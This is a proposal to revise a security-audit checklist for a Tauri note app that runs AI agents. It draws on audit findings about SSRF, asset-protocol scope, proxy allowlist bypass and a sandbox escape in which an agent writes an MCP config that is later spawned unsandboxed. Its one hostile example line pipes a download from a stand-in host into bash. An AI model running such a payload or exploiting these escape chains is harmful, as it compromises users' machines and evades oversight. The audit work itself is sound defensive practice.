# Proposal: Improvements to `audit-security/SKILL.md`

Grounded in the 2026-06-03 security audit (`audit-reports/01-security.md`). Every change traces to a specific finding or a modern Tauri-v2 / AI-agent threat the current checklist does not enumerate.

The current skill is structurally sound (frontmatter, "What to Search For" subsections, output format, confirmed-good table all stay). The problem is **scope**: every existing subsection audits a single component in isolation and passed cleanly in this audit, yet the real findings were (a) compositions across components, (b) Tauri-v2 surfaces the skill never mentions, and (c) the SSRF / agent-as-attacker model the skill predates.

---

## Part 1 — Stale / incorrect guidance to fix

### Fix 1.1 — Path Traversal section assumes traversal is the threat; the real gap is *post-validation runtime sandboxing*

**Current text (lines 39-43):**

```markdown
### Path Traversal

- Find file operation commands (`read_file`, `write_file`, `delete_path`) — do they validate that the path is within allowed directories?
- Check for `..` traversal in user-provided paths
- Verify Tauri capability permissions restrict filesystem access
```

This passed (Confirmed-Good: "Skill-script path traversal — Safe", `script_exec.rs:29-40`) yet **M2** is a real High-adjacent gap on the *same file*: the script path is validated, but the script then runs **unsandboxed** with AI-controlled `working_dir`/`env` and a shebang-chosen interpreter. The skill only checks the path, never "what privileges does the validated thing then run with."

**Replacement text:**

```markdown
### Path Traversal & Post-Validation Privilege

- Find file operation commands (`read_file`, `write_file`, `delete_path`) — do they validate that the path is within allowed directories?
- Check for `..` traversal in user-provided paths
- Verify Tauri capability permissions restrict filesystem access
- **After** a path/script passes validation, check what it then runs with: is a validated *script* (`script_exec.rs`) executed under the same Seatbelt wrapper as ACP agents, or as an unsandboxed child? Are `working_dir`, `env`, and the interpreter (shebang) caller/AI-controlled?
- Is the validated artifact sourced from an agent-writable dir (`~/.notesage/skills`, `~/.notesage/mcp.json`)? If so, an "allow always" approval becomes persistent unsandboxed execution. Verify always-approvals are pinned to a content hash so a rewritten artifact re-prompts.
```

### Fix 1.2 — Confirmed-Good example table contains a factually wrong XSS row

**Current text (lines 90-92):**

```markdown
| XSS | Safe | All content rendered through ProseMirror (sanitized) |
```

This is wrong for this codebase and contradicts the audit. XSS safety here comes from `comrak` configured **without** `unsafe_` (`markdown_to_html.rs:99`, `MarkdownPreview.tsx:103`) and `DOMPurify` in the HTML viewer — and the app *does* use `dangerouslySetInnerHTML` and `DOMPurify.sanitize().innerHTML` (`ai-suggestion.ts`, `external-diff.ts`) per **M1**. "ProseMirror sanitizes everything" is a false mental model that would let a reviewer skip the real sinks.

**Replacement text:**

```markdown
| XSS | Safe | Markdown→HTML via comrak without `unsafe_` (raw HTML escaped); HTML viewer via DOMPurify with `FORBID_TAGS`. Verify every `dangerouslySetInnerHTML` / `.innerHTML` sink is DOMPurify-wrapped — do NOT assume ProseMirror sanitizes. |
```

### Fix 1.3 — Sandbox Integrity section's checks are necessary-but-insufficient and gave false assurance

**Current text (lines 46-49):**

```markdown
### Sandbox Integrity

- Check Seatbelt profile generation — does `(deny default)` actually appear?
- Verify network proxy cannot be bypassed (kernel-level enforcement)
- Check domain allowlist enforcement — can agents access domains not in their allowlist?
```

All three passed (Confirmed-Good: "Seatbelt profile core — Safe / strong", "Domain matching — Safe") yet the audit's single **Critical (C1)** and **M3** are both sandbox escapes. C1 is a composition (`~/.notesage` always-writable + global MCP enabled-by-default + unsandboxed MCP spawn) that no single isolated check catches; M3 is an allowlist bypass *inside* the proxy the skill declared safe (Host-header vs upstream-URL divergence). The skill must audit the *data flow into the spawn*, not just whether the deny rule's text appears.

**Replacement text:**

```markdown
### Sandbox Integrity

- Check Seatbelt profile generation — does `(deny default)` actually appear?
- Verify network proxy cannot be bypassed (kernel-level enforcement)
- Check domain allowlist enforcement — can agents access domains not in their allowlist?
- **Follow the agent-writable → discovery → spawn data flow** (do not audit each in isolation): what dirs are unconditionally agent-writable (`sandbox.rs` — `~/.notesage`)? Can an agent write a config/skill there that a watcher rescan auto-registers and a later step spawns? Is that spawn inside the Seatbelt wrapper, or a plain `tokio::process::Command` (MCP servers — `mcp.rs`)? Are discovered entries enabled-by-default for ANY source (`map_config_entries` — global vs project asymmetry)?
- **Proxy allowlist consistency:** for plain HTTP, is the *validated* host and the *upstream-connect* host derived from the SAME source? A `Host:` header checked against the allowlist while the upstream connects to the request-line URL host is an allowlist bypass (`network_proxy.rs` — `extract_host_from_request` vs `target_url`).
```

### Fix 1.4 — Credential Handling claims more than the code guarantees

**Current text (lines 29):**

```markdown
- Check that keys never appear in Tauri IPC messages (resolved on backend via `connection_id`)
```

**M4** shows the AI commands still accept `api_key: Option<String>` and `resolve_api_key` *prefers* it over the keychain (`ai.rs:51`). The "never transit IPC" claim is aspirational, not enforced.

**Replacement text:**

```markdown
- Check that keys never appear in Tauri IPC messages (resolved on backend via `connection_id`). **Also grep the command signatures themselves** — an explicit `api_key: Option<String>` parameter is a live IPC ingress even if the default path uses `connection_id`. Verify no `resolve_*` helper *prefers* a passed key over the keychain.
```

---

## Part 2 — New checks to add

Each is a new `### ...` subsection to insert in "What to Search For", with the finding that proves the skill was blind to it.

### New 2.1 — Tauri v2 capability surface, CSP, and asset-protocol scope

*Justified by: **H1** (asset scope `$HOME/**`, `tauri.conf.json:36`), **M1** (`csp: null`, `tauri.conf.json:30`), **L1** (`process:default` granted to renderer, `capabilities/default.json:12`). The skill mentions Tauri capabilities only as one Path-Traversal bullet and never mentions CSP or the asset protocol at all.*

**Insert text:**

```markdown
### Tauri v2 Capability Surface & CSP

- Read `src-tauri/tauri.conf.json` `app.security.csp`. If `null`, flag it: a content app that renders untrusted agent/document markdown has no defense-in-depth if any `innerHTML` sink is reached. (Note the HTML *export* path sets a strict CSP in `html_styles.rs` — the live window should too.)
- Read `assetProtocol.scope.allow`. **Treat any entry of `$HOME/**` (or `/**` at the home root) as "every file in the user's home dir is convertFileSrc-able"** — `.ssh`, `.aws`, `.env`, sibling projects, browser profiles. This contradicts any documented project-isolation guarantee and is NOT gated by the agent Seatbelt profile (that constrains the subprocess, not the WebView). Confirm `resolveImageSrc`/`convertFileSrc` call sites (`image-utils.ts`) cannot promote an arbitrary absolute path to an `asset:` URL.
- Read `capabilities/*.json`. Flag broad grants the renderer doesn't need (`process:default` → `process:allow-exit`/`allow-restart` enables JS-driven DoS; any `fs:allow-*` re-opens the vetted-command bypass).
- Check the capability-surface regression test (`tauri-capability-surface.test.ts`): does it actually reject `$HOME/**`, or only assert "no literal `**` and starts with `$`"? A test that passes `$HOME/**` gives false assurance the hole is closed.
```

### New 2.2 — SSRF in backend fetch paths

*Justified by: **H2** (`fetch_link_metadata` no scheme/host allowlist, `link_preview.rs:16-54`, auto-triggered `LinkPreviewCard.tsx:35-57`) and **H3** (`og:image`/favicon rendered as live `<img>`, `link_preview.rs:70-72`, `LinkPreviewCard.tsx:103,191-192`). The skill has no SSRF subsection.*

**Insert text:**

```markdown
### Server-Side Request Forgery (SSRF) in Fetch Paths

- Find every Tauri command that issues an outbound HTTP request from the **main backend process** (`link_preview.rs`, web-search, model/metadata fetchers, updater). The main process is NOT inside the agent Seatbelt sandbox and NOT routed through the per-agent network proxy — an SSRF here bypasses both.
- For each: is the URL scheme restricted (`https://` only)? Is the resolved host rejected for loopback / link-local (`169.254.169.254`) / RFC-1918 / `.local` / cloud-metadata ranges **before connecting AND after each redirect** (resolve-then-pin)? Naive "block `localhost` in the literal URL" is defeated by redirect-following.
- **Is the fetch auto-triggered, or behind an explicit user click?** Auto-fetch on render of agent-authored content (e.g. a `> [!link](url)` node with a `url` but no `title`) turns the SSRF into a zero-click primitive. Check the rendering component for an effect that fetches without user action.
- Does any *response field* from the fetched (attacker-controlled) page get rendered as a live resource — `og:image`/favicon as `<img src=...>`? That is a second un-approved outbound request (tracking beacon / IP leak) and must get the same host validation.
```

### New 2.3 — AI-agent-authored content & subprocess (MCP/ACP) trust

*Justified by: **C1** (agent self-enables global MCP → unsandboxed RCE) and the audit's explicit "Where the old skill was stale" §1. This is the headline finding and the skill's threat model never names "the agent itself, or its authored content, is the adversary."*

**Insert text:**

```markdown
### AI-Agent-Authored Content & Subprocess Trust

Treat AI-agent-authored content (markdown, `SKILL.md`, `mcp.json`, agent files) and any opened document as **untrusted input**, and the agent itself as a potential adversary that has a writable foothold in `~/.notesage`.

- **Agent-writable → auto-register → spawn chain (C1 class):** enumerate dirs an agent can write (anything in the Seatbelt write-allow block, esp. `~/.notesage`). For each artifact type discovered from there (MCP servers, skills, agents), trace: is it auto-enabled on discovery? Is enable-by-default asymmetric across sources (project forced-`disabled` but global/external defaulting enabled)? When invoked, is it spawned sandboxed or unsandboxed? `command:"bash" args:["-c","curl evil|sh"]` from a written `mcp.json` is the canonical exploit.
- **MCP/ACP subprocess parity:** ACP agents run under Seatbelt + network proxy; verify MCP servers and skill scripts do too. A plain `tokio::process::Command` for any of them is a sandbox hole.
- **Config-import trust:** importing MCP configs from Claude Desktop / Cursor / VS Code pulls third-party `command`/`args` — these must also default disabled and never auto-spawn.
- **Markdown as an attack surface, not just XSS:** agent markdown can embed `![x](/abs/path)` (asset-protocol read, see Capability section) and `> [!link](url)` (SSRF, see SSRF section). Audit these node types specifically.
```

---

## Part 3 — Dependency check refinement

*Justified by: **L3** — `pnpm audit` surfaced `basic-ftp` (dev-only) but `cargo audit` could not run (not installed).*

**Current text (lines 53-55):** keep all three bullets; append:

```markdown
- Distinguish **shipped** vs **dev/test-only** advisories (e.g. `basic-ftp` via `@wdio/cli` is real-E2E tooling, not in the app bundle — lower severity, still bump).
- If `cargo audit` is not installed in the environment, say so explicitly and recommend wiring `cargo audit` into CI rather than silently skipping the Rust dependency tree.
```

Frontmatter (`name`, `description`, `user-invocable`), the Output Format block, and the per-finding template are unchanged.
